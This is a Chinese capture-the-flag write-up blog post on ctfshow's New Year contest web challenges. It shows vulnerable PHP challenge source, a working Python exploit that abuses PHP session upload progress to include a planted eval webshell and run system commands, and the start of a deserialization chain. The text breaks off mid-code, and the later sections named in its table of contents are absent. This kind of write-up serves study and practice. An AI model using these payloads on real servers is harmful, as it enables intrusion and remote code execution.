<!doctype html><html lang=en dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="有意思的"><title>ctfshow元旦水友赛</title><link rel=canonical href=https://baozongwi.xyz/p/ctfshow-new-year-water-friends-match/><link rel=stylesheet href=/scss/style.min.946cca6c6259ef94ac55abfae7c7bf3291ea3ed5eea17ef77500b257217c6710.css><meta property='og:title' content="ctfshow元旦水友赛"><meta property='og:description' content="有意思的"><meta property='og:url' content='https://baozongwi.xyz/p/ctfshow-new-year-water-friends-match/'><meta property='og:site_name' content="baozongwi's blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='RaceCondition'><meta property='article:tag' content='thinkphp'><meta property='article:published_time' content='2025-01-20T18:53:17+00:00'><meta property='article:modified_time' content='2025-01-20T18:53:17+00:00'><meta name=twitter:title content="ctfshow元旦水友赛"><meta name=twitter:description content="有意思的"><link rel="shortcut icon" href=/logo.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/acvtar_hu_773da4d2b586f7f.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>baozongwi's blog</a></h1><h2 class=site-description>H@cking Th3 Fu1ure</h2></div></header><ol class=menu-social><li><a href=mailto:baozongwi@qq.com target=_blank title=Email rel=me><svg viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><rect x="3" y="5" width="18" height="14" rx="2"/><path d="M3 7l9 6 9-6"/></svg></a></li><li><a href=/index.xml target=_blank title=RSS rel=me><svg class="icon icon-tabler icon-tabler-rss" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="5" cy="19" r="1"/><path d="M4 4a16 16 0 0116 16"/><path d="M4 11a9 9 0 019 9"/></svg></a></li><li><a href=https://github.com/baozongwi target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>Home</span></a></li><li><a href=/about/><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
<span>About</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>Search</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
<span>Links</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#easy_include>easy_include</a></li><li><a href=#easy_web>easy_web</a></li><li><a href=#孤注一掷>孤注一掷</a></li><li><a href=#easy_login>easy_login</a><ol><li><a href=#预期>预期</a></li><li><a href=#非预期>非预期</a></li></ol></li><li><a href=#easy_api>easy_api</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/ctfshow/>Ctfshow</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/ctfshow-new-year-water-friends-match/>ctfshow元旦水友赛</a></h2><h3 class=article-subtitle>有意思的</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published>Jan 20, 2025</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>12 minute read</time></div></footer></div></header><section class=article-content><h2 id=easy_include>easy_include</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>waf</span><span class=p>(</span><span class=nv>$path</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=nv>$path</span> <span class=o>=</span> <span class=nx>str_replace</span><span class=p>(</span><span class=s2>&#34;.&#34;</span><span class=p>,</span><span class=s2>&#34;&#34;</span><span class=p>,</span><span class=nv>$path</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>preg_match</span><span class=p>(</span><span class=s2>&#34;/^[a-z]+/&#34;</span><span class=p>,</span><span class=nv>$path</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>waf</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=mi>1</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>    <span class=k>include</span> <span class=s2>&#34;file://&#34;</span><span class=o>.</span><span class=nv>$_POST</span><span class=p>[</span><span class=mi>1</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>这个waf就是检查路径是否是小写字母开头，直接打session包含，但是路径怎么写呢，这里有个file的协议，后面知道<code>file:///etc/passwd</code>其实是和<code>localhost/etc/passwd</code>等效的</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span><span class=o>=</span><span class=s2>&#34;http://6484c74f-5b47-49fe-a98d-87059cc10ee8.challenge.ctf.show/&#34;</span>
</span></span><span class=line><span class=cl><span class=n>data</span><span class=o>=</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;PHP_SESSION_UPLOAD_PROGRESS&#34;</span><span class=p>:</span><span class=s2>&#34;&lt;?php @eval($_POST[2]);?&gt;&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;1&#34;</span><span class=p>:</span><span class=s2>&#34;localhost/tmp/sess_wi&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=c1># &#34;2&#34;:&#34;system(&#39;ls /&#39;);&#34;</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;2&#34;</span><span class=p>:</span><span class=s2>&#34;system(&#39;cat /f*&#39;);&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>file</span><span class=o>=</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;file&#34;</span><span class=p>:</span><span class=s2>&#34;wi&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>cookies</span><span class=o>=</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;PHPSESSID&#34;</span><span class=p>:</span><span class=s2>&#34;wi&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>,</span><span class=n>cookies</span><span class=o>=</span><span class=n>cookies</span><span class=p>,</span><span class=n>files</span><span class=o>=</span><span class=n>file</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>response</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=easy_web>easy_web</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>header</span><span class=p>(</span><span class=s1>&#39;Content-Type:text/html;charset=utf-8&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>waf1</span><span class=p>(</span><span class=nv>$Chu0</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=k>foreach</span> <span class=p>(</span><span class=nv>$Chu0</span> <span class=k>as</span> <span class=nv>$name</span> <span class=o>=&gt;</span> <span class=nv>$value</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/[a-z]/i&#39;</span><span class=p>,</span> <span class=nv>$value</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>            <span class=k>exit</span><span class=p>(</span><span class=s2>&#34;waf1&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>waf2</span><span class=p>(</span><span class=nv>$Chu0</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/show/i&#39;</span><span class=p>,</span> <span class=nv>$Chu0</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=k>exit</span><span class=p>(</span><span class=s2>&#34;waf2&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>waf_in_waf_php</span><span class=p>(</span><span class=nv>$a</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=nv>$count</span> <span class=o>=</span> <span class=nx>substr_count</span><span class=p>(</span><span class=nv>$a</span><span class=p>,</span><span class=s1>&#39;base64&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s2>&#34;hinthinthint,base64喔&#34;</span><span class=o>.</span><span class=s2>&#34;&lt;br&gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nv>$count</span><span class=o>!=</span><span class=mi>1</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=k>True</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/ucs-2|phar|data|input|zip|flag|\%/i&#39;</span><span class=p>,</span><span class=nv>$a</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=k>True</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=k>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>ctf</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$h1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$h2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__wakeup</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=k>throw</span> <span class=k>new</span> <span class=nx>Exception</span><span class=p>(</span><span class=s2>&#34;fastfast&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__destruct</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>h1</span><span class=o>-&gt;</span><span class=na>nonono</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>h2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>show</span><span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__call</span><span class=p>(</span><span class=nv>$name</span><span class=p>,</span><span class=nv>$args</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/ctf/i&#39;</span><span class=p>,</span><span class=nv>$args</span><span class=p>[</span><span class=mi>0</span><span class=p>][</span><span class=mi>0</span><span class=p>][</span><span class=mi>2</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>            <span class=k>echo</span> <span class=s2>&#34;gogogo&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Chu0_write</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$chu0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$chu1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$cmd</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>chu0</span> <span class=o>=</span> <span class=s1>&#39;xiuxiuxiu&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__toString</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s2>&#34;__toString&#34;</span><span class=o>.</span><span class=s2>&#34;&lt;br&gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>chu0</span><span class=o>===</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>chu1</span><span class=p>){</span>
</span></span><span class=line><span class=cl>            <span class=nv>$content</span><span class=o>=</span><span class=s1>&#39;ctfshowshowshowwww&#39;</span><span class=o>.</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;chu0&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>waf_in_waf_php</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;name&#39;</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>                <span class=nx>file_put_contents</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;name&#39;</span><span class=p>]</span><span class=o>.</span><span class=s2>&#34;.txt&#34;</span><span class=p>,</span><span class=nv>$content</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=k>echo</span> <span class=s2>&#34;绕一下吧孩子&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>                <span class=nv>$tmp</span> <span class=o>=</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=s1>&#39;ctfw.txt&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=k>echo</span> <span class=nv>$tmp</span><span class=o>.</span><span class=s2>&#34;&lt;br&gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>preg_match</span><span class=p>(</span><span class=s2>&#34;/f|l|a|g|x|\*|\?|\[|\]| |\&#39;|\&lt;|\&gt;|\%/i&#34;</span><span class=p>,</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;cmd&#39;</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>                    <span class=k>eval</span><span class=p>(</span><span class=nv>$tmp</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;cmd&#39;</span><span class=p>]));</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=k>echo</span> <span class=s2>&#34;waf!&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=nx>file_put_contents</span><span class=p>(</span><span class=s2>&#34;ctfw.txt&#34;</span><span class=p>,</span><span class=s2>&#34;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s2>&#34;Go on&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;show_show.show&#39;</span><span class=p>]){</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s2>&#34;开胃小菜，就让我成为签到题叭&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s2>&#34;WAF,启动！&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nx>waf1</span><span class=p>(</span><span class=nv>$_REQUEST</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>waf2</span><span class=p>(</span><span class=nv>$_SERVER</span><span class=p>[</span><span class=s1>&#39;QUERY_STRING&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/^[Oa]:[\d]/i&#39;</span><span class=p>,</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;show_show.show&#39;</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>        <span class=nx>unserialize</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;show_show.show&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s2>&#34;被waf啦&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>其实链子并不是很难，因为没有绕弯子的地方，不过我还是有疑问，为啥这里的<code>__call</code>能够触发<code>toString</code>，不是类被当做是字符串处理才会吗</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>ctf</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$h1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$h2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__destruct</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
